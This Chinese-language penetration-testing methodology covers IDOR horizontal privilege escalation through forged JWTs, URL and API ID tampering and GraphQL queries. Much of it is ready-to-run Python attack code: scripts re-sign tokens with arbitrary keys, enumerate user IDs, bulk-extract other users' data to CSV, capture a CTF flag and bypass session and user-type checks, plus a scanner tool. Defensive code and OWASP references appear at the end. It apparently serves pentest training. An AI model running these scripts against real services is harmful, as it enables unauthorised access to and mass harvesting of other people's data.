# IDOR 水平权限提升攻击方法论

## 第一部分：文档概述

### 1.1 编写目的
本方法论文档旨在为渗透测试人员提供一套标准化、可复现的 IDOR（不安全的直接对象引用）水平权限提升攻击流程，针对应用程序缺少资源所有权验证的缺陷进行系统性测试与利用，实现未授权访问其他用户数据。

### 1.2 适用范围
本文档适用于以下场景：
- URL 参数中包含对象 ID（如 user_id、order_id、file_id）
- JWT/Session/Cookie 中包含用户标识符
- API 请求体中包含资源 ID
- 修改对象 ID 可访问他人数据
- 缺少资源所有权验证

### 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

## 第二部分：核心渗透技术专题

### 专题一：基于 JWT 的 IDOR 攻击

#### 2.1.1 技术介绍
基于 JWT 的 IDOR 攻击是指应用程序使用 JWT 令牌中的用户标识符（如 user_id）来确定访问哪个用户的数据，但未验证该标识符是否与当前认证用户匹配，导致攻击者可以通过篡改 JWT 中的 user_id 来访问任意用户数据。

**漏洞本质：** 应用程序信任客户端提供的用户标识符，未进行所有权验证。

**典型代码特征：**
```python
# 漏洞代码 - 使用 JWT 中的 user_id 直接查询数据
@app.route('/dashboard')
def dashboard():
    token = request.cookies.get('auth_token')
    data = jwt.decode(token, secret, algorithms=['HS256'],
        options={'verify_signature': False})  # 签名验证禁用
    
    user_id = data['user_id']  # 直接使用 JWT 中的 user_id
    user = User.query.get(user_id)  # 无所有权检查
    
    return render_template('dashboard.html', user=user)
```

#### 2.1.2 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户仪表板 | 显示用户个人信息 | 修改 JWT user_id 查看他人信息 |
| 订单管理 | 查看订单详情 | 遍历 order_id 查看他人订单 |
| 文件存储 | 下载用户文件 | 修改 file_id 下载他人文件 |
| 消息系统 | 查看私信 | 遍历 message_id 读取他人消息 |
| CTF 挑战 | 获取 flag 用户数据 | 访问 flag 用户的 last_name 字段 |

#### 2.1.3 漏洞探测方法

**黑盒测试：**

1. **JWT 结构分析**
   ```bash
   # 解码 JWT payload
   echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMn0.xxx" | \
     cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
   
   # 输出：
   # {
   #   "username": "test",
   #   "user_id": 10032,
   #   "user_type": "customer"
   # }
   ```

2. **IDOR 测试流程**
   ```python
   import jwt
   import requests
   
   # 步骤 1：登录获取合法 JWT
   session = requests.Session()
   session.post("http://localhost:44191/password/test",
       data={"password": "test", "username": "test"})
   
   original_jwt = session.cookies.get('auth_token')
   print(f"Original JWT: {original_jwt}")
   
   # 步骤 2：解码并修改 user_id
   decoded = jwt.decode(original_jwt, options={"verify_signature": False})
   print(f"Original payload: {decoded}")
   
   # 修改为目标用户 ID
   decoded['user_id'] = 10019  # Flag 用户 ID
   
   # 步骤 3：使用任意密钥重新签名
   forged_jwt = jwt.encode(decoded, "any_secret", algorithm="HS256")
   print(f"Forged JWT: {forged_jwt}")
   
   # 步骤 4：用伪造的 JWT 访问
   session.cookies.set('auth_token', forged_jwt)
   response = session.get("http://localhost:44191/dashboard")
   
   # 步骤 5：检查响应
   if response.status_code == 200:
       print("[+] IDOR SUCCESSFUL - Accessed other user's data!")
       print(f"Response: {response.text[:500]}")
   ```

3. **批量 ID 遍历测试**
   ```python
   import jwt
   import requests
   
   base_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
   user_ids = range(10000, 10100)  # 测试 100 个用户 ID
   
   for uid in user_ids:
       # 修改 user_id
       decoded = jwt.decode(base_jwt, options={"verify_signature": False})
       decoded['user_id'] = uid
       forged_jwt = jwt.encode(decoded, "any", algorithm="HS256")
       
       # 测试访问
       session = requests.Session()
       session.cookies.set('auth_token', forged_jwt)
       response = session.get("http://target/dashboard")
       
       if response.status_code == 200 and "Welcome" in response.text:
           # 提取用户名
           import re
           match = re.search(r'Welcome, ([\w\s]+)!', response.text)
           if match:
               print(f"[+] User ID {uid}: {match.group(1).strip()}")
   ```

**白盒测试：**

1. **代码审计关键词搜索**
   ```bash
   # 搜索 JWT 解码和 user_id 使用
   grep -rn "jwt.decode" --include="*.py"
   grep -rn "data\['user_id'\]" --include="*.py"
   grep -rn "data\[\"user_id\"\]" --include="*.py"
   
   # 搜索缺少所有权检查的模式
   grep -rn "User.query.get.*user_id" --include="*.py"
   grep -rn "WHERE.*user_id.*=" --include="*.sql"
   ```

2. **漏洞代码模式识别**
   ```python
   # 漏洞代码 - 无所有权检查
   @app.route('/dashboard')
   def dashboard():
       # 从 JWT 获取 user_id
       token = request.cookies.get('auth_token')
       data = jwt.decode(token, secret, options={'verify_signature': False})
       user_id = data['user_id']  # 客户端控制的值
       
       # 直接查询，无所有权验证
       user = User.query.get(user_id)
       
       return render_template('dashboard.html', user=user)
   
   # 正确代码 - 有所有权检查
   @app.route('/dashboard')
   def dashboard():
       # 从服务器端 Session 获取 user_id
       session_user_id = session.get('user_id')
       
       # 或使用 JWT 但验证签名
       token = request.cookies.get('auth_token')
       data = jwt.decode(token, secret, algorithms=['HS256'])  # 验证签名
       
       # 确保 JWT user_id 与 Session user_id 匹配
       if data['user_id'] != session_user_id:
           return "Unauthorized", 403
       
       user = User.query.get(session_user_id)  # 使用服务器端 ID
       return render_template('dashboard.html', user=user)
   ```

#### 2.1.4 漏洞利用方法

**基础利用 - 访问特定用户：**

```python
import jwt

# 原始 JWT（自己的账户）
original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMn0.xxx"

# 目标：访问 user_id=10019 的 flag 用户
payload = {
    "username": "test",      # 保持自己的用户名
    "user_id": 10019,        # 改为目标用户 ID
    "user_type": "customer"
}

# 伪造 JWT（签名验证被禁用）
forged = jwt.encode(payload, "wrong_secret", algorithm="HS256")

# 访问目标资源
import requests
session = requests.Session()
session.cookies.set('auth_token', forged)
response = session.get("http://localhost:44191/dashboard")

# 提取 flag
import re
flag_match = re.search(r'FLAG\{[\w-]+\}', response.text)
if flag_match:
    print(f"Flag captured: {flag_match.group()}")
```

**进阶利用 - 批量数据提取：**

```python
import jwt
import requests
import csv

def extract_all_users(base_url, original_jwt, user_id_range):
    """批量提取指定范围内的所有用户数据"""
    
    users_data = []
    
    for uid in user_id_range:
        try:
            # 伪造 JWT
            payload = {"user_id": uid, "username": "attacker"}
            forged_jwt = jwt.encode(payload, "any", algorithm="HS256")
            
            # 访问用户数据
            session = requests.Session()
            session.cookies.set('auth_token', forged_jwt)
            response = session.get(f"{base_url}/dashboard")
            
            if response.status_code == 200:
                # 解析用户信息
                import re
                name_match = re.search(r'Welcome, ([\w\s]+)!', response.text)
                if name_match:
                    name = name_match.group(1).strip()
                    users_data.append({"user_id": uid, "name": name})
                    print(f"[+] User {uid}: {name}")
        
        except Exception as e:
            print(f"[-] Error for user {uid}: {e}")
    
    # 保存结果
    with open('extracted_users.csv', 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['user_id', 'name'])
        writer.writeheader()
        writer.writerows(users_data)
    
    print(f"[*] Extracted {len(users_data)} users to extracted_users.csv")
    return users_data

# 使用示例
extract_all_users("http://localhost:44191", original_jwt, range(10000, 10100))
```

**组合攻击 - JWT 伪造 + 敏感数据提取：**

```python
import jwt
import requests
import re

# 目标：获取 flag 用户的 last_name 字段
target_user_id = 10019

# 1. 伪造 JWT
payload = {
    "username": "attacker",
    "user_id": target_user_id,
    "user_type": "customer"
}
forged_jwt = jwt.encode(payload, "any_secret", algorithm="HS256")

# 2. 访问仪表板
session = requests.Session()
session.cookies.set('auth_token', forged_jwt)
response = session.get("http://localhost:44191/dashboard")

# 3. 从 HTML 中提取 last_name
# 假设模板显示：Welcome, {first_name} {last_name}
name_match = re.search(r'Welcome, (\w+) ([\w\{\}]+)', response.text)
if name_match:
    first_name = name_match.group(1)
    last_name = name_match.group(2)
    print(f"First Name: {first_name}")
    print(f"Last Name: {last_name}")
    
    # 检查 last_name 是否包含 flag
    if 'FLAG{' in last_name or 'flag{' in last_name:
        print(f"[+] FLAG CAPTURED: {last_name}")
```

#### 2.1.5 漏洞利用绕过方法

**绕过 Session 绑定检查：**

如果应用同时检查 Session 和 JWT：

```python
# 方法：保持有效 Session，仅替换 JWT
session = requests.Session()

# 1. 建立合法 Session（任何用户）
session.post("http://target/login",
    data={"username": "test", "password": "test"})

# 2. 伪造目标用户的 JWT
forged_jwt = jwt.encode({"user_id": 10019}, "any", algorithm="HS256")

# 3. 替换 JWT 但保留 Session
session.cookies.set('auth_token', forged_jwt)

# 4. 访问目标数据
response = session.get("http://target/dashboard")
```

**绕过用户类型检查：**

如果应用检查 user_type：

```python
# 保持原有 user_type，仅修改 user_id
original = jwt.decode(original_jwt, options={"verify_signature": False})
original['user_id'] = 10019  # 只改 ID，保留其他字段
forged_jwt = jwt.encode(original, "any", algorithm="HS256")
```

---

### 专题二：基于 URL 参数的 IDOR 攻击

#### 2.2.1 技术介绍
基于 URL 参数的 IDOR 攻击是指应用程序通过 URL 参数传递资源 ID（如 `/user/123/profile` 或 `/order?id=456`），但未验证请求者是否有权访问该资源，导致攻击者可以通过修改参数值访问他人数据。

#### 2.2.2 探测与利用

```python
import requests

# 步骤 1：访问自己的资源
session = requests.Session()
session.post("http://target/login", data={"user": "attacker", "pass": "pass"})

# 访问自己的资料
response = session.get("http://target/user/10032/profile")
print(f"My profile: {response.text[:200]}")

# 步骤 2：修改 ID 访问他人资源
response = session.get("http://target/user/10019/profile")

if response.status_code == 200:
    print("[+] IDOR SUCCESSFUL!")
    print(f"Victim profile: {response.text[:200]}")

# 步骤 3：批量遍历
for uid in range(10000, 10100):
    response = session.get(f"http://target/user/{uid}/profile")
    if response.status_code == 200:
        print(f"[+] User {uid} exists")
```

---

### 专题三：基于 API 的 IDOR 攻击

#### 2.3.1 技术介绍
基于 API 的 IDOR 攻击是指 REST API 或 GraphQL API 端点接受客户端提供的资源 ID，但未验证请求者是否有权访问该资源。

#### 2.3.2 探测与利用

**REST API IDOR：**

```python
import requests

session = requests.Session()
session.post("http://target/api/login", json={"user": "attacker", "pass": "pass"})

# 获取自己的订单
response = session.get("http://target/api/orders/1001")
print(f"My order: {response.json()}")

# 尝试访问他人订单
response = session.get("http://target/api/orders/1002")
if response.status_code == 200:
    print("[+] IDOR in Orders API!")
    print(f"Victim order: {response.json()}")
```

**GraphQL API IDOR：**

```python
import requests

query = """
query {
    user(id: "10019") {
        id
        username
        email
        orders {
            id
            total
        }
    }
}
"""

response = requests.post("http://target/graphql",
    json={"query": query})

print(response.json())
# 如果返回目标用户数据，说明存在 IDOR
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 攻击目标 | Payload 示例 | 说明 |
|---------|-------------|------|
| JWT user_id 篡改 | `{"user_id": 1}` | 访问 ID=1 的用户 |
| URL 参数遍历 | `/user/{id}/profile` | 遍历 id 参数 |
| API 资源 ID | `/api/orders/{id}` | 遍历订单 ID |
| GraphQL 查询 | `user(id: "10019")` | 指定目标用户 ID |
| Cookie 用户 ID | `user_id=10019` | 修改 Cookie 中的 ID |

### 3.2 自动化 IDOR 检测工具

```python
#!/usr/bin/env python3
"""
IDOR 检测工具
用法：python idor_scanner.py -t http://target -u 10032 -v 10019
"""

import argparse
import requests
import jwt

class IDORScanner:
    def __init__(self, target_url, own_id, victim_id):
        self.target = target_url.rstrip('/')
        self.own_id = own_id
        self.victim_id = victim_id
        self.session = requests.Session()
    
    def login(self, username, password):
        """登录获取会话"""
        self.session.post(f"{self.target}/login",
            data={"username": username, "password": password})
    
    def test_jwt_idor(self, original_jwt):
        """测试 JWT IDOR"""
        # 解码原始 JWT
        decoded = jwt.decode(original_jwt, options={"verify_signature": False})
        original_id = decoded.get('user_id')
        
        # 修改为受害者 ID
        decoded['user_id'] = self.victim_id
        forged_jwt = jwt.encode(decoded, "any", algorithm="HS256")
        
        # 测试访问
        self.session.cookies.set('auth_token', forged_jwt)
        response = self.session.get(f"{self.target}/dashboard")
        
        if response.status_code == 200:
            print(f"[+] JWT IDOR VULNERABLE")
            return True
        return False
    
    def test_url_idor(self, endpoint_pattern):
        """测试 URL 参数 IDOR"""
        # 访问自己的资源
        own_url = endpoint_pattern.format(id=self.own_id)
        own_response = self.session.get(f"{self.target}{own_url}")
        
        # 访问受害者资源
        victim_url = endpoint_pattern.format(id=self.victim_id)
        victim_response = self.session.get(f"{self.target}{victim_url}")
        
        if victim_response.status_code == 200:
            print(f"[+] URL IDOR VULNERABLE: {victim_url}")
            return True
        return False
    
    def test_api_idor(self, api_pattern):
        """测试 API IDOR"""
        victim_url = api_pattern.format(id=self.victim_id)
        response = self.session.get(f"{self.target}{victim_url}")
        
        if response.status_code == 200 and response.json():
            print(f"[+] API IDOR VULNERABLE: {victim_url}")
            return True
        return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-u", "--own-id", type=int, required=True)
    parser.add_argument("-v", "--victim-id", type=int, required=True)
    parser.add_argument("--jwt", help="Original JWT token")
    args = parser.parse_args()
    
    scanner = IDORScanner(args.target, args.own_id, args.victim_id)
    
    # 测试 JWT IDOR
    if args.jwt:
        print("[*] Testing JWT IDOR...")
        scanner.test_jwt_idor(args.jwt)
    
    # 测试 URL IDOR
    print("[*] Testing URL IDOR...")
    scanner.test_url_idor("/user/{id}/profile")
    scanner.test_url_idor("/api/users/{id}")
    
    # 测试 API IDOR
    print("[*] Testing API IDOR...")
    scanner.test_api_idor("/api/orders/{id}")
    scanner.test_api_idor("/api/files/{id}")

if __name__ == "__main__":
    main()
```

### 3.3 防御建议

1. **使用服务器端会话存储用户 ID**
   ```python
   # 正确做法
   @app.route('/dashboard')
   def dashboard():
       user_id = session.get('user_id')  # 从服务器端 Session 获取
       user = User.query.get(user_id)
       return render_template('dashboard.html', user=user)
   ```

2. **验证 JWT 签名并绑定会话**
   ```python
   @app.route('/dashboard')
   def dashboard():
       # 验证 JWT 签名
       token = request.cookies.get('auth_token')
       data = jwt.decode(token, secret, algorithms=['HS256'])
       
       # 验证 JWT user_id 与 Session user_id 匹配
       session_user_id = session.get('user_id')
       if data['user_id'] != session_user_id:
           return "Unauthorized", 403
       
       user = User.query.get(session_user_id)
   ```

3. **实施资源所有权检查**
   ```python
   @app.route('/orders/<order_id>')
   def get_order(order_id):
       order = Order.query.get(order_id)
       
       # 检查所有权
       if order.user_id != session.get('user_id'):
           return "Forbidden", 403
       
       return jsonify(order.to_dict())
   ```

4. **使用不可预测的资源标识符**
   ```python
   # 使用 UUID 代替自增 ID
   import uuid
   
   class Order(db.Model):
       id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
       user_id = db.Column(db.Integer)
   ```

---

## 参考资源

- [OWASP Insecure Direct Object Reference Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control/idor)
